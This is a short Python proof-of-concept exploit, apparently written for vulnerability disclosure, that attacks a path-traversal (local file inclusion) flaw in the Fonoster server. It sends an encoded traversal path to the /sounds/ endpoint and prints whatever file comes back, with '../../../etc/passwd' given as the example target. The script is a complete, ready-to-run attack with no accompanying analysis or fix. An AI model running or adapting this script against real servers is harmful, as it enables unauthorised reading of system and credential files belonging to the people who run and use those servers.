#!/usr/bin/env python3

import argparse
import requests
import urllib.parse

def retrieve_file(url, file_path):
    encoded_path = urllib.parse.quote_plus(file_path)
    full_url = f"{url}/sounds/{encoded_path}"
    
    headers = {
        'User-Agent': 'ZeroPath PoC',
        'Accept': '*/*',
    }

    print(f"[*] Generated URL: {full_url}")
    
    response = requests.get(full_url, headers=headers)
    return response.status_code, response.text

def main():
    parser = argparse.ArgumentParser(description='Fonoster LFI PoC')
    parser.add_argument('--url', required=True, help='Fonoster server URL (e.g., http://localhost:3000)')
    parser.add_argument('--path', required=True, help='File path to retrieve (e.g., ../../../etc/passwd)')

    args = parser.parse_args()

    print("[!] Fonoster LFI PoC")
    print(f"[*] Target URL: {args.url}")
    print(f"[*] Attempting to retrieve file: {args.path}")

    status_code, response_text = retrieve_file(args.url, args.path)
    
    print(f"[*] Response Status Code: {status_code}")
    
    if status_code == 200:
        print("[+] File retrieved successfully!")
        print("[*] File contents:")
        print(response_text)
    else:
        print("[-] File retrieval failed.")
        print("[*] Response:")
        print(response_text)

if __name__ == "__main__":
    main()